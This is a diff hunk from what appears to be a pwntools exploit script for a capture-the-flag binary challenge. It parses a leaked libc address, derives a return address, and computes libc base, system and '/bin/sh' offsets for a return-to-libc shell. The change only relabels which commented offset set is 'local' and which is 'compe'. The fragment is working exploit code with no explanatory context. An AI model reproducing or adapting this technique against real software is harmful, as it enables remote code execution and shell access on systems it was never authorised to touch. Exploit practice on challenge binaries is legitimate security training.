@@ -55,9 +55,9 @@ leak = r.recvuntil('new?')
 libc_leak = int(leak.split('\n')[2].split(', ')[0], 16)
 ret_addr = int(leak.split('\n')[2].split(', ')[1], 16) + 4
 
-# base = libc_leak - 0x18637# 0x19af3 # compe
-# system = base + 0x3ada0# 0x40310 # compe
-# binsh = base + 0x15ba0b# 0x122a3c # compe
+# base = libc_leak - 0x18637# 0x19af3 # local
+# system = base + 0x3ada0# 0x40310 # local
+# binsh = base + 0x15ba0b# 0x122a3c # local
 base = libc_leak - 0x19af3 # compe
 system = base + 0x40310 # compe
 binsh = base + 0x162d4c # compe
